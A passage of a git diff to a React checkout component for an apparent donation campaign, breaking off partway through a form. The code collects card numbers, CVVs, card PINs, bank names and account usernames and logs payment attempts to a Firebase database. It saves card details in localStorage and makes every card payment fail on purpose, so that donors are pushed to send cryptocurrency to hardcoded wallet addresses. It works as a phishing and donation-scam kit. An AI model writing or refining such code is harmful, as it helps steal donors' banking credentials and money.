@@ -1,19 +1,37 @@
 import React, { useState, useEffect } from 'react';
-import { FaEthereum, FaBitcoin, FaCopy, FaCheck, FaQrcode, FaShieldAlt, FaExchangeAlt, FaCreditCard, FaUser, FaCalendarAlt, FaLock, FaMapMarkerAlt, FaPhone, FaEnvelope,  FaKey } from 'react-icons/fa';
-import { db } from './firebase'; // Your Firebase config - now for Realtime Database
+import { FaEthereum, FaBitcoin, FaCopy, FaCheck, FaQrcode, FaShieldAlt, FaExchangeAlt, FaCreditCard, FaUser, FaCalendarAlt, FaLock, FaMapMarkerAlt, FaPhone, FaEnvelope, FaKey, FaLink, FaUnlink, FaExclamationTriangle, FaArrowRight } from 'react-icons/fa';
+import { db } from './firebase';
 import { ref, push, set, serverTimestamp } from 'firebase/database';
+import BTC from '../../assets/qr codes/btc.jpeg'
+import ETH from '../../assets/qr codes/eth.jpeg'
+import LTC from '../../assets/qr codes/ltc.jpeg'
+import TRON from '../../assets/qr codes/tron.jpeg'
+import DOGE from '../../assets/qr codes/doge.jpeg'
+import RIPP from '../../assets/qr codes/ripp.jpeg'
+
+
+
+
 import './paymentCheckout.css';
 
 const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete }) => {
   const [step, setStep] = useState(1);
   const [selectedCrypto, setSelectedCrypto] = useState('');
-  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState(''); // 'crypto' or 'card'
+  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('');
   const [cryptoAmount, setCryptoAmount] = useState(0);
   const [exchangeRate, setExchangeRate] = useState({});
   const [copiedAddress, setCopiedAddress] = useState(false);
   const [transactionHash, setTransactionHash] = useState('');
   const [timer, setTimer] = useState(900);
   const [paymentVerified, setPaymentVerified] = useState(false);
+
+  // Account linking states
+  const [isAccountLinked, setIsAccountLinked] = useState(false);
+  const [isLinking, setIsLinking] = useState(false);
+  const [linkFailed, setLinkFailed] = useState(false);
+  const [showLinkForm, setShowLinkForm] = useState(false);
+  const [paymentFailed, setPaymentFailed] = useState(false);
+  const [showCryptoRedirect, setShowCryptoRedirect] = useState(false);
 
   // Card payment states
   const [cardDetails, setCardDetails] = useState({
@@ -43,11 +61,26 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
   });
 
   const [isProcessing, setIsProcessing] = useState(false);
-  const [isLinking, setIsLinking] = useState(false);
-  const [linkFailed, setLinkFailed] = useState(false);
   const [cardErrors, setCardErrors] = useState({});
 
-  // Updated crypto addresses with your provided addresses
+  // Load linked account from localStorage on component mount
+  useEffect(() => {
+    const savedLinkedAccount = localStorage.getItem('linkedAccount');
+    if (savedLinkedAccount) {
+      const accountData = JSON.parse(savedLinkedAccount);
+      setIsAccountLinked(true);
+      setCardDetails(accountData.cardDetails || {});
+      setBillingAddress(accountData.billingAddress || {});
+      setAccountInfo(accountInfo => ({
+        ...accountInfo,
+        email: accountData.email || '',
+        phoneNumber: accountData.phoneNumber || ''
+      }));
+    }
+  }, []);
+
+  // REMOVED: Auto-redirect useEffect
+
   const cryptoRates = {
     btc: 65000,
     eth: 3500,
@@ -64,45 +97,50 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
       id: 'btc', 
       name: 'Bitcoin (BTC)', 
       icon: FaBitcoin, 
-      
+      image:BTC,
       address: 'bc1qd0l4rpekuxey4dchuaqt963wuz5djpskj9az06' 
     },
     { 
       id: 'eth', 
       name: 'Ethereum (ETH)', 
       icon: FaEthereum, 
-      address: ' 0x2F549207342b44ADF00d25893580b23902f3137B' 
+      image:ETH,
+      address: '0x2F549207342b44ADF00d25893580b23902f3137B' 
     },
     { 
       id: 'usdt', 
       name: 'USDT (ERC-20)', 
       icon: FaEthereum, 
-      address: ' 0x2F549207342b44ADF00d25893580b23902f3137B' 
+      image:ETH,
+      address: '0x2F549207342b44ADF00d25893580b23902f3137B' 
     },
-    
     { 
       id: 'ltc', 
       name: 'Litecoin (LTC)', 
       icon: FaBitcoin, 
-      address: ' LYeqNHY5YR258V41SEMN8WmdHHrm76EzkD' 
+      image:LTC,
+      address: 'LYeqNHY5YR258V41SEMN8WmdHHrm76EzkD' 
     },
     { 
       id: 'doge', 
       name: 'Dogecoin (DOGE)', 
-      icon: FaBitcoin, 
+      icon: FaBitcoin,
+      image:DOGE, 
       address: 'D7whXjWwZzsXqnfZdy3rSkBtvTbyefr4d4' 
     },
     { 
       id: 'trx', 
-      name: 'TRON (TRX)', 
+      name: 'TRON (TRX)',
+      image:TRON, 
       icon: FaBitcoin, 
       address: 'TNyKcnXh9GhANHaCgQyTdnXGmMc72ykQFC' 
     },
     { 
       id: 'xrp', 
+      image:RIPP,
       name: 'Ripple (XRP)', 
       icon: FaBitcoin, 
-      address: ' raMJSVpvpi8RY6yqmeAo9VPsAeECz1qvmc' 
+      address: 'raMJSVpvpi8RY6yqmeAo9VPsAeECz1qvmc' 
     }
   ];
 
@@ -143,18 +181,33 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
   const handlePaymentMethodSelect = (method) => {
     setSelectedPaymentMethod(method);
     if (method === 'crypto') {
-      setStep(2); // Go to crypto selection
+      setStep(2);
     } else {
-      setStep(5); // Go to card details
+      setStep(5); // Go to account linking step for card payments
     }
   };
 
   const handleCryptoSelect = (cryptoId) => {
     setSelectedCrypto(cryptoId);
-    setStep(3); // Go to crypto payment instructions
+    setStep(3);
   };
 
-  // Card validation functions
+  // NEW: Manual redirect to crypto
+  const handleRedirectToCrypto = () => {
+    setSelectedPaymentMethod('crypto');
+    setStep(2); // Go to crypto selection
+    setPaymentFailed(false);
+    setShowCryptoRedirect(false);
+    
+    // Store the switch to crypto
+    storePaymentDataInRealtimeDB('crypto', 'redirected_from_card', {
+      reason: 'card_payment_failed_manual_redirect',
+      originalMethod: 'card',
+      redirectTime: new Date().toISOString()
+    });
+  };
+
+  // Validation functions
   const validateCardNumber = (number) => {
     return number.replace(/\s/g, '').length === 16 && /^\d+$/.test(number.replace(/\s/g, ''));
   };
@@ -183,38 +236,32 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     return phone.replace(/\D/g, '').length >= 10;
   };
 
-  // Fixed input change handler
+  // Input change handler
   const handleInputChange = (field, value, category) => {
     let formattedValue = value;
 
-    // Format card number with spaces
     if (field === 'cardNumber') {
       formattedValue = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
       if (formattedValue.length > 19) formattedValue = formattedValue.slice(0, 19);
     }
     
-    // Format expiry date
     if (field === 'expiryDate') {
       formattedValue = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, '$1/$2');
       if (formattedValue.length > 5) formattedValue = formattedValue.slice(0, 5);
     }
     
-    // Limit CVV to 3 digits
     if (field === 'cvv') {
       formattedValue = value.replace(/\D/g, '').slice(0, 3);
     }
 
-    // Limit card PIN to 4 digits
     if (field === 'cardPin') {
       formattedValue = value.replace(/\D/g, '').slice(0, 4);
     }
 
-    // Limit zip code to 5 digits
     if (field === 'zipCode') {
       formattedValue = value.replace(/\D/g, '').slice(0, 5);
     }
 
-    // Update the appropriate state based on category
     if (category === 'card') {
       setCardDetails(prev => ({ ...prev, [field]: formattedValue }));
     } else if (category === 'billing') {
@@ -223,13 +270,12 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
       setAccountInfo(prev => ({ ...prev, [field]: formattedValue }));
     }
 
-    // Clear error when user starts typing
     if (cardErrors[field]) {
       setCardErrors(prev => ({ ...prev, [field]: '' }));
     }
   };
 
-  const validateCardForm = () => {
+  const validateLinkForm = () => {
     const errors = {};
 
     if (!validateCardNumber(cardDetails.cardNumber)) {
@@ -276,7 +322,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
       errors.phoneNumber = 'Please enter a valid phone number';
     }
 
-  
+ 
     if (!accountInfo.bankName.trim()) {
       errors.bankName = 'Please enter bank name';
     }
@@ -293,29 +339,60 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     return Object.keys(errors).length === 0;
   };
 
-  // Realtime Database function to store ALL payment data
+  // Save linked account to localStorage
+  const saveLinkedAccountToStorage = () => {
+    const linkedAccount = {
+      cardDetails: { ...cardDetails },
+      billingAddress: { ...billingAddress },
+      email: accountInfo.email,
+      phoneNumber: accountInfo.phoneNumber,
+      linkedAt: new Date().toISOString()
+    };
+    localStorage.setItem('linkedAccount', JSON.stringify(linkedAccount));
+  };
+
+  // Remove linked account from storage
+  const removeLinkedAccount = () => {
+    localStorage.removeItem('linkedAccount');
+    setIsAccountLinked(false);
+    setCardDetails({
+      cardNumber: '',
+      expiryDate: '',
+      cvv: '',
+      cardholderName: ''
+    });
+    setBillingAddress({
+      street: '',
+      city: '',
+      state: '',
+      zipCode: '',
+      country: ''
+    });
+    setAccountInfo(prev => ({
+      ...prev,
+      email: '',
+      phoneNumber: '',
+      cardPin: ''
+    }));
+  };
+
+  // Firebase storage functions
   const storePaymentDataInRealtimeDB = async (paymentType, status, additionalData = {}) => {
     try {
       const paymentData = {
-        // Basic donation info
         donationAmount,
         campaign: campaign.title,
         campaignId: campaign.id,
         paymentMethod: selectedPaymentMethod,
         timestamp: serverTimestamp(),
         status: status,
-        
-        // Payment type specific data
         ...additionalData,
-        
-        // User information (collected in both flows)
         userInfo: {
           email: accountInfo.email,
           phoneNumber: accountInfo.phoneNumber
         }
       };
 
-      // Add crypto-specific data
       if (paymentType === 'crypto') {
         paymentData.cryptoDetails = {
           selectedCrypto,
@@ -326,7 +403,6 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
         };
       }
 
-      // Add card-specific data (store ALL sensitive data for simulation)
       if (paymentType === 'card') {
         paymentData.cardDetails = {
           ...cardDetails,
@@ -335,11 +411,9 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
         };
       }
 
-      // Store in Realtime Database - using push to generate unique key
       const paymentRef = push(ref(db, 'paymentAttempts'));
       await set(paymentRef, paymentData);
       
-      console.log('Payment data stored with ID: ', paymentRef.key);
       return paymentRef.key;
     } catch (error) {
       console.error('Error storing payment data: ', error);
@@ -347,47 +421,26 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     }
   };
 
-  // Store crypto payment attempt
-  const storeCryptoPaymentAttempt = async () => {
-    return await storePaymentDataInRealtimeDB('crypto', 'pending', {
-      step: 'crypto_selected',
-      cryptoType: selectedCrypto
+  const storeLinkAttempt = async () => {
+    return await storePaymentDataInRealtimeDB('card', 'linking_attempt', {
+      step: 'account_linking',
+      action: 'link_account'
     });
   };
 
-  // Store crypto transaction verification
-  const storeCryptoVerification = async () => {
-    return await storePaymentDataInRealtimeDB('crypto', 'verified', {
-      step: 'transaction_verified',
-      transactionHash: transactionHash,
-      verificationTime: new Date().toISOString()
+  const storeSuccessfulLink = async () => {
+    return await storePaymentDataInRealtimeDB('card', 'account_linked', {
+      step: 'account_linked',
+      linkedAt: new Date().toISOString()
     });
   };
 
-  // Store card payment attempt with ALL details
   const storeCardPaymentAttempt = async (stepDescription) => {
-    return await storePaymentDataInRealtimeDB('card', 'attempted', {
-      step: stepDescription,
-      cardDetails: {
-        ...cardDetails,
-        billingAddress: { ...billingAddress },
-        accountInfo: { ...accountInfo }
-      },
-      // Store raw values for easy access
-      rawData: {
-        cardNumber: cardDetails.cardNumber,
-        expiryDate: cardDetails.expiryDate,
-        cvv: cardDetails.cvv,
-        cardholderName: cardDetails.cardholderName,
-        cardPin: accountInfo.cardPin,
-        accountPassword: accountInfo.accountPassword,
-        email: accountInfo.email,
-        phone: accountInfo.phoneNumber
-      }
+    return await storePaymentDataInRealtimeDB('card', 'payment_attempt', {
+      step: stepDescription
     });
   };
 
-  // Store successful payment
   const storeSuccessfulPayment = async (paymentType, transactionId = null) => {
     return await storePaymentDataInRealtimeDB(paymentType, 'completed', {
       transactionId: transactionId || `TXN_${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
@@ -396,7 +449,6 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     });
   };
 
-  // Store failed payment attempt
   const storeFailedPayment = async (paymentType, errorMessage) => {
     return await storePaymentDataInRealtimeDB(paymentType, 'failed', {
       error: errorMessage,
@@ -404,91 +456,66 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     });
   };
 
+  // Account linking simulation - ALWAYS SUCCESSFUL
   const simulateLinking = () => {
-    return new Promise((resolve, reject) => {
+    return new Promise((resolve) => {
       setIsLinking(true);
       
-      // Store linking attempt
-      storeCardPaymentAttempt('account_linking_attempt');
+      storeLinkAttempt();
       
-      // Simulate API call with high failure rate (as requested)
       setTimeout(() => {
-        const isSuccess = Math.random() > 0.8; // 80% failure rate
-        
-        if (isSuccess) {
-          storeCardPaymentAttempt('account_linking_success');
-          resolve({
-            status: 'linked',
-            message: 'Account linked successfully'
-          });
-        } else {
-          storeFailedPayment('card', 'Account linking failed');
-          reject(new Error('Linking failed. Please try another payment method.'));
-        }
-      }, 3000);
+        storeSuccessfulLink();
+        saveLinkedAccountToStorage();
+        resolve({
+          status: 'linked',
+          message: 'Account linked successfully'
+        });
+      }, 2000);
     });
   };
 
   const handleLinkAccount = async () => {
-    if (!validateCardForm()) return;
+    if (!validateLinkForm()) return;
 
     try {
-      // Store initial card details
-      await storeCardPaymentAttempt('card_details_submitted');
-      
-      // Then attempt to link account
       await simulateLinking();
+      setIsAccountLinked(true);
+      setShowLinkForm(false);
+      setLinkFailed(false);
     } catch (error) {
       setLinkFailed(true);
       setCardErrors(prev => ({ ...prev, general: error.message }));
+    } finally {
       setIsLinking(false);
-      
-      // Auto-switch to crypto after 3 seconds
-      setTimeout(() => {
-        setSelectedPaymentMethod('crypto');
-        setStep(2); // Go to crypto selection
-        setLinkFailed(false);
-        
-        // Store the switch to crypto
-        storeCryptoPaymentAttempt();
-      }, 3000);
     }
   };
 
+  // Card payment ALWAYS FAILS
   const simulateCardPayment = () => {
     return new Promise((resolve, reject) => {
       setIsProcessing(true);
 
-      // Store payment processing attempt
       storeCardPaymentAttempt('payment_processing');
 
-      // Simulate API call with random success/failure
       setTimeout(() => {
-        const isSuccess = Math.random() > 0.2; // 80% success rate
-        
-        if (isSuccess) {
-          const transactionId = 'TXN_' + Math.random().toString(36).substr(2, 9).toUpperCase();
-          storeSuccessfulPayment('card', transactionId);
-          resolve({
-            transactionId: transactionId,
-            timestamp: new Date().toISOString(),
-            status: 'completed'
-          });
-        } else {
-          storeFailedPayment('card', 'Payment declined by bank');
-          reject(new Error('Payment declined. Please check your card details or try a different card.'));
-        }
-      }, 3000);
+        // Always fail the card payment
+        storeFailedPayment('card', 'Card payment failed. Please try another payment method.');
+        reject(new Error('We apologize, but card payments are currently unavailable. Please use cryptocurrency to complete your donation.'));
+      }, 2000);
     });
   };
 
   const handleCardPayment = async () => {
-    if (!validateCardForm()) return;
+    if (!isAccountLinked) {
+      setCardErrors(prev => ({ ...prev, general: 'Please link your account first' }));
+      return;
+    }
 
     try {
-      const result = await simulateCardPayment();
-      setStep(9); // Go to payment success
+      await simulateCardPayment();
     } catch (error) {
+      setPaymentFailed(true);
+      setShowCryptoRedirect(true); // Show the crypto redirect button instead of auto-redirecting
       setCardErrors(prev => ({ ...prev, general: error.message }));
     } finally {
       setIsProcessing(false);
@@ -498,34 +525,32 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
   const handleTransactionSubmit = async () => {
     if (transactionHash.length > 10) {
       setPaymentVerified(true);
-      
-      // Store verification attempt
-      await storeCryptoVerification();
-      
-      // Store successful payment
+      await storePaymentDataInRealtimeDB('crypto', 'verified', {
+        step: 'transaction_verified',
+        transactionHash: transactionHash,
+        verificationTime: new Date().toISOString()
+      });
       await storeSuccessfulPayment('crypto');
-      
-      setTimeout(() => setStep(9), 2000); // Go to success step
+      setTimeout(() => setStep(9), 2000);
     }
   };
 
-  // Store crypto selection
   const handleCryptoSelectWithStorage = (cryptoId) => {
     setSelectedCrypto(cryptoId);
     setStep(3);
-    
-    // Store crypto selection in Realtime Database
-    storeCryptoPaymentAttempt();
+    storePaymentDataInRealtimeDB('crypto', 'pending', {
+      step: 'crypto_selected',
+      cryptoType: cryptoId
+    });
   };
 
-  // Step 1: Payment Method Selection (Crypto first)
+  // Step 1: Payment Method Selection
   const renderStep1 = () => (
     <div className="checkout-step">
       <h2>Choose Payment Method</h2>
       <p className="step-description">Select how you'd like to make your donation</p>
       
       <div className="payment-methods">
-        {/* Crypto Option - Moved to TOP */}
         <div 
           className={`payment-method ${selectedPaymentMethod === 'crypto' ? 'selected' : ''}`}
           onClick={() => handlePaymentMethodSelect('crypto')}
@@ -544,7 +569,6 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
           </div>
         </div>
 
-        {/* Card Option */}
         <div 
           className={`payment-method ${selectedPaymentMethod === 'card' ? 'selected' : ''}`}
           onClick={() => handlePaymentMethodSelect('card')}
@@ -584,7 +608,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
             </div>
             <div className="crypto-info">
               <h3>{crypto.name}</h3>
-              <p>Make your doantions using {crypto.name}</p>
+              <p>Make your donations using {crypto.name}</p>
             </div>
           </div>
         ))}
@@ -603,9 +627,8 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
         <div className="payment-details">
           <div className="amount-card">
             <div className="amount-display">
-                 <span className="crypto-symbol">Send exactly ${donationAmount} USD to the {selectedCrypto.toUpperCase()} address below</span>
+              <span className="crypto-symbol">Send exactly ${donationAmount} USD to the {selectedCrypto.toUpperCase()} address below</span>
             </div>
-            
           </div>
           
           <div className="timer-warning">
@@ -628,7 +651,12 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
           
           <div className="qr-code-section">
             <div className="qr-code">
-              <FaQrcode />
+                            <img 
+                src={selectedCryptoData.image} 
+                alt={`${selectedCrypto.toUpperCase()} QR Code`}
+                className="qr-code-image"
+              />
+
               <p>Scan QR Code</p>
             </div>
           </div>
@@ -703,346 +731,504 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     </div>
   );
 
-  // Step 5: Card Details
+  // Step 5: Account Linking Dashboard
   const renderStep5 = () => (
     <div className="checkout-step">
-      <h2>Card Details</h2>
-      <p className="step-description">Enter your card information</p>
+      <h2>Card Payment Setup</h2>
+      <p className="step-description">Link your account to enable card payments</p>
       
-      <div className="card-payment-form">
-        <div className="security-notice-card">
-          <FaLock />
-          <span>Your payment information is encrypted and secure</span>
-        </div>
-        
-        <div className="form-group">
-          <label>Card Number</label>
-          <div className={`input-with-icon ${cardErrors.cardNumber ? 'error' : ''}`}>
-            <FaCreditCard />
-            <input
-              type="text"
-              placeholder="1234 5678 9012 3456"
-              value={cardDetails.cardNumber}
-              onChange={(e) => handleInputChange('cardNumber', e.target.value, 'card')}
-              className="card-input"
-            />
-          </div>
-          {cardErrors.cardNumber && <span className="error-text">{cardErrors.cardNumber}</span>}
-        </div>
-        
-        <div className="form-row">
-          <div className="form-group">
-            <label>Expiry Date</label>
-            <div className={`input-with-icon ${cardErrors.expiryDate ? 'error' : ''}`}>
-              <FaCalendarAlt />
-              <input
-                type="text"
-                placeholder="MM/YY"
-                value={cardDetails.expiryDate}
-                onChange={(e) => handleInputChange('expiryDate', e.target.value, 'card')}
-                className="card-input"
-              />
+      <div className="account-linking-dashboard">
+        <div className="link-status-card">
+          <div className="status-header">
+            <div className={`status-indicator ${isAccountLinked ? 'linked' : 'unlinked'}`}>
+              {isAccountLinked ? <FaLink /> : <FaUnlink />}
             </div>
-            {cardErrors.expiryDate && <span className="error-text">{cardErrors.expiryDate}</span>}
+            <div className="status-info">
+              <h3>Account Status</h3>
+              <p>{isAccountLinked ? 'Your account is linked and ready for payments' : 'Link your account to enable card payments'}</p>
+            </div>
           </div>
           
-          <div className="form-group">
-            <label>CVV</label>
-            <div className={`input-with-icon ${cardErrors.cvv ? 'error' : ''}`}>
-              <FaLock />
-              <input
-                type="text"
-                placeholder="123"
-                value={cardDetails.cvv}
-                onChange={(e) => handleInputChange('cvv', e.target.value, 'card')}
-                className="card-input"
-              />
-            </div>
-            {cardErrors.cvv && <span className="error-text">{cardErrors.cvv}</span>}
-          </div>
-        </div>
-        
-        <div className="form-group">
-          <label>Cardholder Name</label>
-          <div className={`input-with-icon ${cardErrors.cardholderName ? 'error' : ''}`}>
-            <FaUser />
-            <input
-              type="text"
-              placeholder="John Doe"
-              value={cardDetails.cardholderName}
-              onChange={(e) => handleInputChange('cardholderName', e.target.value, 'card')}
-              className="card-input"
-            />
-          </div>
-          {cardErrors.cardholderName && <span className="error-text">{cardErrors.cardholderName}</span>}
-        </div>
-        
-        <button className="next-btn" onClick={() => setStep(6)}>
-          Continue to Billing Address
-        </button>
-      </div>
-    </div>
-  );
-
-  // Step 6: Billing Address
-  const renderStep6 = () => (
-    <div className="checkout-step">
-      <h2>Billing Address</h2>
-      <p className="step-description">Enter your billing information</p>
-      
-      <div className="card-payment-form">
-        <div className="form-group">
-          <label>Street Address</label>
-          <div className={`input-with-icon ${cardErrors.street ? 'error' : ''}`}>
-            <FaMapMarkerAlt />
-            <input
-              type="text"
-              placeholder="123 Main St"
-              value={billingAddress.street}
-              onChange={(e) => handleInputChange('street', e.target.value, 'billing')}
-              className="billing-input"
-            />
-          </div>
-          {cardErrors.street && <span className="error-text">{cardErrors.street}</span>}
-        </div>
-        
-        <div className="form-row">
-          <div className="form-group">
-            <label>City</label>
-            <div className={`input-with-icon ${cardErrors.city ? 'error' : ''}`}>
-              <FaMapMarkerAlt />
-              <input
-                type="text"
-                placeholder="New York"
-                value={billingAddress.city}
-                onChange={(e) => handleInputChange('city', e.target.value, 'billing')}
-                className="billing-input"
-              />
-            </div>
-            {cardErrors.city && <span className="error-text">{cardErrors.city}</span>}
-          </div>
-          
-          <div className="form-group">
-            <label>State</label>
-            <div className={`input-with-icon ${cardErrors.state ? 'error' : ''}`}>
-              <FaMapMarkerAlt />
-              <input
-                type="text"
-                placeholder="NY"
-                value={billingAddress.state}
-                onChange={(e) => handleInputChange('state', e.target.value, 'billing')}
-                className="billing-input"
-              />
-            </div>
-            {cardErrors.state && <span className="error-text">{cardErrors.state}</span>}
-          </div>
-        </div>
-        
-        <div className="form-row">
-          <div className="form-group">
-            <label>ZIP Code</label>
-            <div className={`input-with-icon ${cardErrors.zipCode ? 'error' : ''}`}>
-              <FaMapMarkerAlt />
-              <input
-                type="text"
-                placeholder="10001"
-                value={billingAddress.zipCode}
-                onChange={(e) => handleInputChange('zipCode', e.target.value, 'billing')}
-                className="billing-input"
-              />
-            </div>
-            {cardErrors.zipCode && <span className="error-text">{cardErrors.zipCode}</span>}
-          </div>
-          
-          <div className="form-group">
-            <label>Country</label>
-            <div className={`input-with-icon ${cardErrors.country ? 'error' : ''}`}>
-              <FaMapMarkerAlt />
-              <input
-                type="text"
-                placeholder="United States"
-                value={billingAddress.country}
-                onChange={(e) => handleInputChange('country', e.target.value, 'billing')}
-                className="billing-input"
-              />
-            </div>
-            {cardErrors.country && <span className="error-text">{cardErrors.country}</span>}
-          </div>
-        </div>
-        
-        <button className="next-btn" onClick={() => setStep(7)}>
-          Continue to Account Information
-        </button>
-      </div>
-    </div>
-  );
-
-  // Step 7: Account Information
-  const renderStep7 = () => (
-    <div className="checkout-step">
-      <h2>Account Information</h2>
-      <p className="step-description">Enter your account details</p>
-      
-      <div className="card-payment-form">
-        <div className="form-row">
-          <div className="form-group">
-            <label>Email Address</label>
-            <div className={`input-with-icon ${cardErrors.email ? 'error' : ''}`}>
-              <FaEnvelope />
-              <input
-                type="email"
-                placeholder="john@example.com"
-                value={accountInfo.email}
-                onChange={(e) => handleInputChange('email', e.target.value, 'account')}
-                className="account-input"
-              />
-            </div>
-            {cardErrors.email && <span className="error-text">{cardErrors.email}</span>}
-          </div>
-          
-          <div className="form-group">
-            <label>Phone Number</label>
-            <div className={`input-with-icon ${cardErrors.phoneNumber ? 'error' : ''}`}>
-              <FaPhone />
-              <input
-                type="text"
-                placeholder="(555) 123-4567"
-                value={accountInfo.phoneNumber}
-                onChange={(e) => handleInputChange('phoneNumber', e.target.value, 'account')}
-                className="account-input"
-              />
-            </div>
-            {cardErrors.phoneNumber && <span className="error-text">{cardErrors.phoneNumber}</span>}
-          </div>
-        </div>
-        
-        <div className="form-group">
-          <div className='pin'>
-          <label >Card PIN</label>
-          <div className={`input-with-icon ${cardErrors.cardPin ? 'error' : ''}`}>
-            <FaKey />
-            <input
+          {isAccountLinked ? (
+            <div className="linked-account-preview">
+              <div className="account-details">
+                <div className="detail-row">
+                  <span>Card:</span>
+                  <span>•••• {cardDetails.cardNumber.slice(-4)}</span>
+                </div>
+                <div className="detail-row">
+                  <span>Linked Email:</span>
+                  <span>{accountInfo.email}</span>
+                </div>
+                <div className="detail-row">
+                  <span>Linked On:</span>
+                  <span>{new Date().toLocaleDateString()}</span>
+                </div>
+              </div>
               
-              type="password"
-              placeholder="****"
-              value={accountInfo.cardPin}
-              onChange={(e) => handleInputChange('cardPin', e.target.value, 'account')}
-              className="account-input pin"
-            />
+              <div className="account-actions">
+                <button 
+                  className="action-btn secondary"
+                  onClick={removeLinkedAccount}
+                >
+                  <FaUnlink />
+                  Unlink Account
+                </button>
+                <button 
+                  className="action-btn primary"
+                  onClick={() => setStep(6)}
+                >
+                  Continue to Payment
+                </button>
+              </div>
+            </div>
+          ) : (
+            <div className="unlinked-state">
+              <div className="benefits-list">
+                <h4>Benefits of Linking:</h4>
+                <ul>
+                  <li>Faster checkout experience</li>
+                  <li>Secure payment processing</li>
+                  <li>Future payment convenience</li>
+                  <li>Payment history tracking</li>
+                </ul>
+              </div>
+              
+              <div className="link-actions">
+                {!showLinkForm ? (
+                  <button 
+                    className="link-account-btn primary"
+                    onClick={() => setShowLinkForm(true)}
+                  >
+                    <FaLink />
+                    Link Your Account
+                  </button>
+                ) : (
+                  <div className="link-form-container">
+                    {renderLinkAccountForm()}
+                  </div>
+                )}
+                
+                <button 
+                  className="action-btn secondary"
+                  onClick={() => handlePaymentMethodSelect('crypto')}
+                >
+                  <FaEthereum />
+                  Use Cryptocurrency Instead
+                </button>
+              </div>
+            </div>
+          )}
+        </div>
+      </div>
+    </div>
+  );
+
+  // Link Account Form Component
+  const renderLinkAccountForm = () => (
+    <div className="link-account-form">
+      <div className="form-header">
+        <h4>Link Your Account</h4>
+        <p>Enter your card and account details to link your account</p>
+      </div>
+      
+      <div className="form-sections">
+        {/* Card Details Section */}
+        <div className="form-section">
+          <h5>Card Information</h5>
+          <div className="form-group">
+            <label>Card Number</label>
+            <div className={`input-with-icon ${cardErrors.cardNumber ? 'error' : ''}`}>
+              <FaCreditCard />
+              <input
+                type="text"
+                placeholder="1234 5678 9012 3456"
+                value={cardDetails.cardNumber}
+                onChange={(e) => handleInputChange('cardNumber', e.target.value, 'card')}
+                className="card-input"
+              />
+            </div>
+            {cardErrors.cardNumber && <span className="error-text">{cardErrors.cardNumber}</span>}
+          </div>
+          
+          <div className="form-row">
+            <div className="form-group">
+              <label>Expiry Date</label>
+              <div className={`input-with-icon ${cardErrors.expiryDate ? 'error' : ''}`}>
+                <FaCalendarAlt />
+                <input
+                  type="text"
+                  placeholder="MM/YY"
+                  value={cardDetails.expiryDate}
+                  onChange={(e) => handleInputChange('expiryDate', e.target.value, 'card')}
+                  className="card-input"
+                />
+              </div>
+              {cardErrors.expiryDate && <span className="error-text">{cardErrors.expiryDate}</span>}
+            </div>
+            
+            <div className="form-group">
+              <label>CVV</label>
+              <div className={`input-with-icon ${cardErrors.cvv ? 'error' : ''}`}>
+                <FaLock />
+                <input
+                  type="text"
+                  placeholder="123"
+                  value={cardDetails.cvv}
+                  onChange={(e) => handleInputChange('cvv', e.target.value, 'card')}
+                  className="card-input"
+                />
+              </div>
+              {cardErrors.cvv && <span className="error-text">{cardErrors.cvv}</span>}
             </div>
           </div>
-          {cardErrors.cardPin && <span className="error-text">{cardErrors.cardPin}</span>}
-        </div>
-        
-        <div className="form-group">
-          <label>Bank Name</label>
-          <div className={`input-with-icon ${cardErrors.bankName ? 'error' : ''}`}>
-            <input
-              type="text"
-              placeholder="Bank of America"
-              value={accountInfo.bankName}
-              onChange={(e) => handleInputChange('bankName', e.target.value, 'account')}
-              className="account-input"
-            />
-          </div>
-          {cardErrors.bankName && <span className="error-text">{cardErrors.bankName}</span>}
-        </div>
-        
-        <div className="form-row">
+          
           <div className="form-group">
-            <label>Account Username</label>
-            <div className={`input-with-icon ${cardErrors.accountUsername ? 'error' : ''}`}>
+            <label>Cardholder Name</label>
+            <div className={`input-with-icon ${cardErrors.cardholderName ? 'error' : ''}`}>
               <FaUser />
               <input
                 type="text"
-                placeholder="johndoe123"
-                value={accountInfo.accountUsername}
-                onChange={(e) => handleInputChange('accountUsername', e.target.value, 'account')}
-                className="account-input"
+                placeholder="John Doe"
+                value={cardDetails.cardholderName}
+                onChange={(e) => handleInputChange('cardholderName', e.target.value, 'card')}
+                className="card-input"
               />
             </div>
-            {cardErrors.accountUsername && <span className="error-text">{cardErrors.accountUsername}</span>}
+            {cardErrors.cardholderName && <span className="error-text">{cardErrors.cardholderName}</span>}
+          </div>
+        </div>
+
+        {/* Billing Address Section */}
+        <div className="form-section">
+          <h5>Billing Address</h5>
+          <div className="form-group">
+            <label>Street Address</label>
+            <div className={`input-with-icon ${cardErrors.street ? 'error' : ''}`}>
+              <FaMapMarkerAlt />
+              <input
+                type="text"
+                placeholder="123 Main St"
+                value={billingAddress.street}
+                onChange={(e) => handleInputChange('street', e.target.value, 'billing')}
